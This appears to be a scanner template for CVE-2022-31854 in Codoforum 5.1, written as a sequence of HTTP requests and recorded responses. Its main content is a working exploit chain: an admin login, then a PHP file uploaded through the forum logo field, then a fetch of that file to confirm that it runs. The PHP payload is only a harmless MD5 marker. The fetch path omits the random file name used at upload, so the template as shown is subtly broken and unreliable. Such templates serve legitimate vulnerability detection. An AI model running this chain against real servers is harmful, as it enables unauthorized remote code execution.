id: CVE-2022-31854
info:
  name: Codoforum 5.1 - Arbitrary File Upload
  author: theamanrawat
  description: 'Codoforum 5.1 contains an arbitrary file upload vulnerability via
    the logo change option in the admin panel. An attacker can upload arbitrary files
    to the server, which in turn can be used to make the application execute file
    content as code. As a result, an attacker can potentially obtain sensitive information,
    modify data, and/or execute unauthorized operations.

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability can result in unauthorized
    remote code execution on the affected system.

    '
  remediation: 'Apply the latest security patch or upgrade to a patched version of
    Codoforum.

    '
  reference:
  - https://bitbucket.org/evnix/codoforum_downloads/downloads/codoforum.v.5.1.zip
  - https://codoforum.com
  - https://vikaran101.medium.com/codoforum-v5-1-authenticated-rce-my-first-cve-f49e19b8bc
  - https://nvd.nist.gov/vuln/detail/CVE-2022-31854
  - https://github.com/trhacknon/Pocingit
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2022-31854
    cwe-id: CWE-434
    epss-score: 0.17108
    epss-percentile: 0.95958
    cpe: cpe:2.3:a:codologic:codoforum:5.1:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: codologic
    product: codoforum
  tags: cve,cve2022,rce,codoforumrce,authenticated,intrusive,codologic
traps:
- request:
    method: POST
    path: /admin/?page=login
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryACGPpj7UIqmtLNbB
    body: |
      ------WebKitFormBoundaryACGPpj7UIqmtLNbB
      Content-Disposition: form-data; name="username"

      {{username}}
      ------WebKitFormBoundaryACGPpj7UIqmtLNbB
      Content-Disposition: form-data; name="password"

      {{password}}
      ------WebKitFormBoundaryACGPpj7UIqmtLNbB--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/index.php?page=config
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /admin/index.php?page=config
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoLtdjuqj2ixPvBhA
    body: |
      ------WebKitFormBoundaryoLtdjuqj2ixPvBhA
      Content-Disposition: form-data; name="site_title"


      ------WebKitFormBoundaryoLtdjuqj2ixPvBhA
      Content-Disposition: form-data; name="forum_logo"; filename="{{randstr}}.php"
      Content-Type:  application/x-httpd-php

      <?php

      echo md5('CVE-2022-31854');

      ?>
      ------WebKitFormBoundaryoLtdjuqj2ixPvBhA
      Content-Disposition: form-data; name="CSRF_token"

      {{csrf}}
      ------WebKitFormBoundaryoLtdjuqj2ixPvBhA--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /sites/default/assets/img/attachments/.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: a63fd49130de6406a66600cd8caa162f
